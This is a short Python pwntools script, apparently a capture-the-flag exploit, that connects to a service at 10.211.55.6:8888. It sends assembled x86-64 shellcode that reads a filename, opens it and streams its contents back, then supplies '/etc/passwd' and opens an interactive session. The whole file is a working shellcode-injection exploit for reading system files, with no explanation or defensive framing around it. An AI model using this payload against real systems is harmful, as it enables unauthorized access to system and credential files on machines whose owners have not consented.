#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwnpwnpwn import *
from pwn import *
import time
host = "10.211.55.6"
port = 8888

r = remote(host,port)

r.recvuntil(":")

sc = asm("""
    xor rax,rax
    xor rdi,rdi
    xor rsi,rsi
    xor rdx,rdx

    mov rsi,rsp
    mov rdx,40
    syscall

    mov rax,2
    mov rdi,rsp
    xor rsi,rsi
    syscall

    mov r15,rax
loop:
    mov rdi,r15
    mov rsi,rsp
    mov rdx,40
    xor rax,rax
    syscall

    mov rdx,rax
    mov rdi,1
    mov rax,1
    syscall
    jmp loop
    
""",arch="amd64")

r.sendline(sc)
time.sleep(0.5)
r.send("/etc/passwd\x00")

r.interactive()
